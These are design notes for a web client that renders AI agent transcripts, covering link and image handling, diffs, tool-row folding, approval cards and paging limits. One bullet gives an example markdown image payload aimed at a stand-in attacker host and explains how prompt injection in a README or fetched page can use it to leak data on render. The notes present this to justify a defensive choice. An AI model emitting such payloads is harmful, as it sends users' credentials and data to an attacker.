---
paths:
  - packages/web/src/ui/tail.ts
  - packages/web/src/ui/EventList.tsx
  - packages/web/src/ui/Markdown.tsx
  - packages/web/src/ui/DiffView.tsx
  - packages/web/src/ui/AskCard.tsx
  - packages/web/src/ui/PermissionCard.tsx
  - packages/web/src/ui/ElicitationCard.tsx
  - packages/web/src/ui/Bubble.tsx
  - packages/web/src/ui/ImagePreview.tsx
  - packages/web/src/ui/links.ts
  - packages/web/src/diff.ts
  - packages/web/src/permission.ts
  - packages/web/src/ask.ts
  - packages/web/src/elicitation.ts
  - packages/web/src/preview.ts
  - packages/web/src/store.ts
---

**The transcript.** Agent output is markdown and is rendered as such; raw HTML
stays off, because it is untrusted text quoting an untrusted repository.
`Markdown.tsx` is memoised on the joined text of a coalesced run.

- **A link is drawn only where there is somewhere to go.** `openableHref` in
  `ui/links.ts` allows `http`, `https` and `mailto`, answers `null` for everything
  else — a path, a `file://` URI, a fragment — and the text is still drawn without
  an anchor. Widening that set is launching a program named by an agent-chosen
  string, the same judgement as the refusal of `url`-mode elicitation, and a
  workspace file is reachable through `GET /sessions/:id/files` with a header
  rather than an `href` a browser follows. **Not an XSS fix**, said out loud so
  nobody deletes the real guard: `javascript:` never reaches it, react-markdown
  empties that upstream. Q3.300.
- **An image is drawn as text for the same reason, only more so — it needs no
  tap.** `Markdown.tsx` must override `img` and bind **no `src`**. react-markdown's
  default transform allows `https:`, so `![](https://attacker/?d=…)` makes the
  browser fetch a host the *agent* chose, on render, with no interaction, from the
  origin holding `reemoat.credential` — prompt injection planted in a README, an
  issue body or a fetched page is the whole delivery mechanism and the query string
  is the channel. The alt text is kept and nothing regresses, because there is no
  image an agent can name that this origin would serve: a workspace file is fetched
  with a header and rendered by `ImagePreview` from a `Blob`. The document's **CSP**
  is defence in depth rather than the fix — `connect-src` is built from `relayUrl`
  and lists the relay's `wss` origin as well as its `https` one, this page being
  deliberately cross-origin to the fleet. Q7.86.
- **A conversation is read from the top, so it loads from the top.** There is **no
  render window**; `loadAll` pages backwards at `EVENTS_PAGE_LIMIT` a time until it
  reaches the start of the log, the agent's own `/clear`, or the tab's 16 MiB
  ceiling, with no per-run budget and no control offering to fetch more. What pays
  for it is `sameNode`, and `decisions` is a context rather than a prop because a
  fresh `Map` per event defeats that memo on every row at once. Q3.114.
- **A cold load has nothing to draw and must say so.** `reattachSince(null, …)`
  attaches at the tail, so history arrives only over HTTP; `TranscriptSkeleton` is
  keyed on `unfetched > 0` and **not** on `loadingHistory`, so a session that
  really has no events says so with no skeleton first and a failed page does not
  blink the skeleton out and back. `SessionView` draws the same shape before its
  *row* has landed — `missingRowReason` and `AppState.listed` — that session not
  being knowably absent until a list has come back from its machine. Q3.419.
- **The only cut is the agent's**: `buildTail`'s third argument is `cut`, the
  newest `context_cleared`. Strictly *below* the marker, so the divider stays as
  the top row.
- **The daemon's bookkeeping is not part of the conversation.**
  `showsInTranscript` refuses status lines, workspace rows and
  `turn_end: end_turn`. Every *other* stop reason is kept: `max_tokens`, `refusal`
  and `cancelled` are turns that did not finish.
- **A thought is not drawn.** The suppression is in `tail.ts`, not the JSX, so a
  refused node spends no render budget — and a dropped thought still *flushes* the
  run, since parts join with no separator.
- **An event nobody draws does not break the message either.** `buildTail` flushes
  the text run only when the event is *not* in `TRANSCRIPT_SILENT`, whose
  boundaries are invisible; flushing unconditionally splits one streamed message
  into two independently parsed `<Markdown>` blocks. Keyed on the **set** and
  deliberately not on `showsInTranscript`, which also answers false for
  `turn_end: end_turn` — that one *is* a boundary, and `webcheck` fails in both
  directions. Q3.100.
- **A request and its answer collapse to one row**, keyed on *whether an answer
  exists* rather than on the request's `decision` field, which the daemon leaves
  null for the request's whole life. A question is drawn as an exchange (the
  answer entered the model's context); an approval is drawn as one line.
- **A run of consecutive tool rows is one row.** `foldRuns` folds it into a
  `GroupNode` carrying a mechanical sentence — clauses from ACP's `kind`, in the
  order each first appeared, with `+N −M` beside it — that opens to the rows it
  replaced. A run of **one** is never wrapped. Open is three-valued for
  `ultracode`'s reason: `null` follows the run, which decides on **one** thing,
  whether it has finished, and a tap outranks that for good. A failure deliberately
  does **not** open it — `override` is component state while `failed > 0` is
  permanent — so `1 failed` rides the collapsed row instead, a bare `ToolCall`
  opening itself on failure only because it has no badge. The re-measure is an
  effect on `open` and not a call in the tap handler, because tool calls interleave
  and only one of the two triggers is a tap. Q3.105.
  **What a run may never swallow**: a **refusal** or an answer nothing can classify,
  an unanswered request, any question, a subagent (its card is already a summary of N
  steps), an orphaned failed update, and anything that is not a tool call. Each
  **breaks** the run in two.
  An **approval** does fold, in document order, with `N approved` on the collapsed
  row — the same "the number survives collapse" idiom as `1 failed`. The asymmetry
  that remains is the true one: **a refusal cannot be hidden**, because `tail.ts`
  merges the request away and the answer is the only record that somebody said no.
  The verdict is asked of `permissionDecisions` and never of `outcome` —
  `selected` includes every `reject_*` option — and every unknown answer falls
  through to *not foldable*, so a failure to classify shows a row rather than
  hiding a refusal. Q3.106.
- **A file change draws a diff, and the counts are the client's own.** `diffLines`
  in `packages/web/src/diff.ts` is the one line-diff in this package, so the approval card and
  the transcript share `ui/DiffView.tsx` rather than resembling each other: a trim
  plus a **bounded** LCS, because codex sends whole files on both sides where
  claude sends a fragment. The counts come from the event, so they state the
  replacement the agent *stated*; `GET /sessions/:id/changes` has git's own numbers
  and is deliberately not called. Two facts are accepted rather than fixed: a
  claude `Write` reports `oldText: null` even when overwriting, so an overwrite
  reads as a creation; and an event clipped by the 128 KiB cap has both sides cut
  at the same offset, so `unavailable` refuses to draw a diff at all and
  `changeCounts` answers `null` rather than 0 — `?? 0` would report the largest
  edit in the log as an empty one. Q3.104. One edit reported twice (kimi's `diff` +
  `fs_write` pair) is one row: matched on the **path**, one credit per absorbed
  change, spent once and in one direction only — never on content, which is
  Q3.108's own correction.
- **A gap is only ever one the daemon reported**, never one the client invented out
  of its own decision not to fetch. Real retention loss is a line at the top from
  `daemonFirstSeq` and `loadedFrom` rather than a `GapMarker`, the daemon evicting
  a *prefix* that is structurally outside any rendered window, and it is drawn only
  once paging has reached the floor (`unfetched === 0`). Q3.46, Q3.47.
- **A conversation loads whole.** `MAX_TRANSCRIPT_BYTES` (16 MiB) is the only
  ceiling **on one conversation** — no event count beside it, because two bounds on
  one resource means the wrong one decides. It was documented as the *tab's* only
  ceiling and was not one: nothing evicted a transcript, so a tab that visited N
  conversations retained N of them, each entitled to 16 MiB. `MAX_HELD_TRANSCRIPTS`
  (12) is the other half, applied in `trimTranscripts`, and **a session with a live
  stream is never evicted** — so what goes is somewhere you navigated through, at the
  cost of the re-fetch a cold open already pays. `HISTORY_PAGE`/`EVENTS_PAGE_LIMIT` are 5000, a round-trip
  count in disguise since a window spans that many seqs; raising it is free because
  `EVENTS_PAGE_BYTES` (768 KiB) is what actually bounds a page — lowered from 2 MiB
  as the coupled half of `STREAM_WINDOW_BYTES`, so at 5000 seqs the byte cap is what
  governs for anything but a trivial page. Q3.114.
- **Why a conversation does not start at its beginning is *one* answer, and every
  state of it says something.** `transcriptNotice` in `store.ts` is six-valued —
  `skeleton`, `loading`, `stalled`, `ceiling`, `floor`, `empty` — and `EventList`
  draws exactly what it answers, through a single string that also feeds the
  `role="status"` region. It lives beside `loadStop` because the two read the same
  five `Transcript` fields from opposite ends: that one decides whether paging
  carries on, this one says why it is not there yet. `webcheck` asserts the
  **totality** over a 720-state grid — with history outstanding and no cut,
  something is always said. Q3.112.
- **Opening a tool card re-measures whether the reader is still at the bottom.** No
  scroll event fires when content grows *under* you, so `atBottom` stays true and
  the next event scrolls the just-opened card out of view. One `remeasure` on the
  next frame, honest in both directions, rather than a "stop following" flag.

**The ask card.** `ui/AskCard.tsx` owns the frame: where it sits, that it moves
nothing behind it, the collapse, the ✕, the numbered answer rows, the digit
shortcuts. It is `absolute` in a region ending where the composer begins, so
`bottom-0` is the top of the composer, and `inset-0` rather than `bottom-0` is
what *bounds* it — a card anchored to the bottom grows upwards and would paint
over the session header. The frame is `pointer-events-none` and the card
`pointer-events-auto`. **Every option is visible at once** — hiding a reject
behind a disclosure is a safety regression. 44px rows. The spinner is overlaid
rather than replacing the label. De-emphasis in fill and border, never in text.
`essentialContext` and `detailContext` are a **partition**, so nothing is drawn
twice and the disclosure sits *between* them. There is **no scrim** — Q3.39.

**A row of buttons carries its meaning by position, so an option that cannot be a
button is not drawn.** With the colour removed, what says which button is which is
*where it is*: the refusal alone on the left, the reversible approval filled on the
right — and the halves are **nested groups rather than one row with a `flex-1`
spacer**, because a spacer only spaces the line it is on and any wrap at all
dissolves the rule silently.

`drawableOptions` is the removal, and it is narrowed four ways. *By length, never
by id*: nothing knows the string `accept_execpolicy_amendment`, because
recognising an option by its id or its wording is the guessing this codebase
refuses everywhere. *Approvals only* — a refusal is kept whatever it is called,
being the one option whose absence reads as "there was no way to say no".
*Decisions only* — more than one `allow_once` means these are a question's
**answers** rather than one approval's scopes, the same test `askedQuestion` makes,
and nothing is filtered. *Never a scope's only representative* — an over-long
approval goes only when another option of the **same kind** survives it. The last
two are not decoration and `webcheck` fails in three places without them; what is
lost when it fires is the **broadest** grant on offer, and only ever while a
narrower one of the same kind is still on the card. Q3.92.

**Two options of one `kind` is why the labels there are the agent's own.**
`optionLabel` substitutes our word only when the kind identifies the option;
codex's two `allow_always` entries would both read "Always allow", which is the one
rendering that must never happen — the scope is the whole difference between them.
`webcheck` pins that it does.

## Layout

| File | Holds |
|---|---|
| `packages/web/src/permission.ts` | What is actually being approved, from the request and from the log — not the diff, which is `diff.ts`'s |
| `packages/web/src/elicitation.ts` | A question as controls somebody can fill in: the field union, the draft rules, and `elicitationAnswer` — the request body and the `canSubmit` in one pass. Reads no field name, ever |
| `packages/web/src/ask.ts` | What the ask card holds: a half-filled form, which question is on screen, whether the card is folded — keyed by the *request*, not the session |
| `packages/web/src/ui/tail.ts` | The transcript's shape as pure functions: coalescing, the five-events merge, which card a step belongs to, what it refuses to draw, where a `/clear` cuts, what a permission was answered with, `sameNode` — and which rows stand together: `foldRuns`, the clause grammar behind `runSummary`, and the one direction in which a duplicated `file_change` is dropped |
| `packages/web/src/diff.ts` | What a file change was, as lines: the trim, the bounded LCS, hunks with two sets of line numbers, the word-level marks, the `+N −M`, and the refusal to draw a diff over an event the log clipped. The `WeakMap` behind `changeCounts` is why `buildTail` may ask on every token |
| `packages/web/src/ui/DiffView.tsx` | A file change, drawn — for the transcript **and** the approval card. Its body paints `bg-surface` inside a `raised` frame because that is the ground the two tints were measured against; on `raised` they are 1.03:1, i.e. invisible |
| `packages/web/src/ui/links.ts` | `openableHref`: which schemes a tap in agent output may open, and why a relative path is text rather than a link. Named for the case collision with `Markdown.tsx` on a case-insensitive filesystem |
| `packages/web/src/ui/Markdown.tsx` | Agent output as markdown; code blocks with a lazily-loaded highlighter |
| `packages/web/src/ui/Bubble.tsx` | The user's own messages, right-aligned. One component, three call sites |
| `packages/web/src/ui/AskCard.tsx` | The one card for "the agent is waiting on you", whichever way it asked. Two bodies go inside it and neither knows what the other is |
| `packages/web/src/ui/ElicitationCard.tsx` | The question's body. Renders generically, which is what makes it right for an MCP schema as well as `AskUserQuestion` |

## Bounds

| | |
|---|---|
| Transcript diff | **250 000 LCS cells** (`MAX_LCS_CELLS`) after the prefix/suffix trim, past which it degrades to one replacement block and says `wholeFile` — Q3.104. 60 drawn lines per file (`DIFF_MAX_LINES`), with `omitted` carrying the rest and the counts staying the **true** totals. 2 lines of context (`DIFF_CONTEXT`). A word-level mark is dropped once it would cover more than 60% of its line (`MAX_MARK_SHARE`), past which the two lines are not one line edited and the row tint has already said so — Q3.301. 400 chars (`MAX_MARK_CHARS`) is the longest pair compared character by character. `changeCounts` memoises in a `WeakMap` keyed on the event, so a diff is computed once per event for the life of the tab |
